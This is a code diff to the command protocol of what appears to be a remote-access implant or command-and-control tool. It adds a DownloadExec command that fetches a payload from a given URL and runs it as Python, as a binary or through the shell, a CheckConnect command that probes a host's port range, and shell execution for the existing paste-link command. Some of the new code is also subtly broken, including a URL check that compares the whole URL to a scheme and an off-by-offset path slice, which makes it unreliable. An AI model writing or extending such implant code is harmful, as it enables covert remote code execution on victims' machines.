@@ -12,6 +12,9 @@ import platform
 import uuid
 import uptime
 import urllib2
+import urlparse
+import StringIO
+import socket
 
 def from_bytes(bytes):
     return sum(ord(byte) * (256**i) for i, byte in enumerate(bytes))
@@ -70,17 +73,40 @@ class Sleep(Command):
     @staticmethod
     def unpack(data):
         return Sleep(
-            struct.unpack_from('<H', data)
+            struct.unpack_from('<H', data)[0]
         ), struct.calcsize('<H')
 
     def pack(self):
         return struct.pack('<H', self.timeout)
 
     def __init__(self, timeout=30):
-        self.timeout = timeout
+        self.timeout = int(timeout)
 
     def __repr__(self):
         return '{{SLEEP: {}}}'.format(self.timeout)
+
+class CheckConnect(Command):
+    @staticmethod
+    def unpack(data):
+        host, port_start, port_end = struct.unpack_from('IHH', data)
+        return CheckConnect(
+            host, port_start, port_end
+        ), struct.calcsize('IHH')
+
+    def __init__(self, host, port_start, port_end=None):
+        self.host = netaddr.IPAddress(host)
+        self.port_start = port_start
+        self.port_end = None if port_end == 0 else port_end
+
+    def pack(self):
+        return struct.pack(
+            'IHH',
+            int(self.host), int(self.port_start), int(self.port_end)
+        )
+
+    def __repr__(self):
+        return '{{CHECK: {}:{}-{}}}'.format(
+            self.host, self.port_start, self.port_end)
 
 class Reexec(Command):
     @staticmethod
@@ -297,6 +323,85 @@ class Connect(Command):
 
         return Connect(host, port, transport), 1+length
 
+class DownloadExec(Command):
+    # 2 bits - 3 max
+    well_known_downloadexec_action_decode = dict(enumerate([
+        'pyexec', 'exec', 'sh'
+    ]))
+
+    well_known_downloadexec_action_encode = {
+        v:k for k,v in well_known_downloadexec_action_decode.iteritems()
+    }
+
+    # 3 bits - 7 max
+    well_known_downloadexec_scheme_decode = dict(enumerate([
+        'http', 'https', 'ftp', 'tcp'
+    ]))
+
+    well_known_downloadexec_scheme_encode = {
+        v:k for k,v in well_known_downloadexec_scheme_decode.iteritems()
+    }
+
+    def __init__(self, url, action='pyexec', proxy=False):
+        self.proxy = bool(proxy)
+        self.url = url
+        self.action = action
+        if not self.url in ('http', 'https'):
+            self.proxy = False
+
+    def pack(self):
+        try:
+            action = self.well_known_downloadexec_action_encode[self.action]
+        except:
+            raise ValueError('Unknown action: {}'.format(self.action))
+
+        url = urlparse.urlparse(self.url)
+
+        addr = netaddr.IPAddress(url.hostname)
+        if not addr.version == 4:
+            raise ValueError('IPv6 unsupported')
+
+        addr = int(addr)
+        port = int(url.port)
+        path = url.path
+
+        if len(path) > 16:
+            raise ValueError('Too big url path')
+
+        try:
+            scheme = self.well_known_downloadexec_scheme_encode[
+                url.scheme
+            ]
+        except:
+            raise ValueError('Unknown scheme: {}'.format(url.scheme))
+
+        code = (self.proxy << 5) | (action << 3) | scheme
+
+        return struct.pack(
+            'BIHB', code, addr, port, len(path)
+        ) + path
+
+    def __repr__(self):
+        return '{{DEXEC: URL={} ACTION={} PROXY={}}}'.format(
+            self.url, self.action, self.proxy
+        )
+
+    @staticmethod
+    def unpack(data):
+        bsize = struct.calcsize('BIHB')
+        code, addr, port, plen = struct.unpack_from('BIHB', data)
+        action = DownloadExec.well_known_downloadexec_action_decode[(code >> 3) & 3]
+        scheme = DownloadExec.well_known_downloadexec_scheme_decode[code & 7]
+        proxy = bool((code >> 5) & 1)
+        host = str(netaddr.IPAddress(addr))
+        port = ':{}'.format(port) if port else (
+            '' if scheme in ('http', 'ftp', 'https') else 53
+        )
+        path = data[bsize:plen]
+        return DownloadExec('{}://{}{}{}'.format(
+            scheme, host, port, path
+        ), action, proxy), bsize+plen
+
 class PasteLink(Command):
     internet_required = True
 
@@ -349,7 +454,7 @@ class PasteLink(Command):
 
     # 4 max - 2 bits
     well_known_pastebin_action_decode = dict(enumerate([
-        'pyexec', 'exec'
+        'pyexec', 'exec', 'sh'
     ]))
 
     well_known_pastebin_action_encode = {
@@ -467,7 +572,7 @@ class Parcel(object):
     commands = [
         Poll, Ack, Policy, Idle, Kex,
         Connect, PasteLink, SystemInfo, Error, Disconnect, Exit,
-        Sleep, Reexec
+        Sleep, Reexec, DownloadExec, CheckConnect
     ]
 
     commands_decode = dict(enumerate(commands))
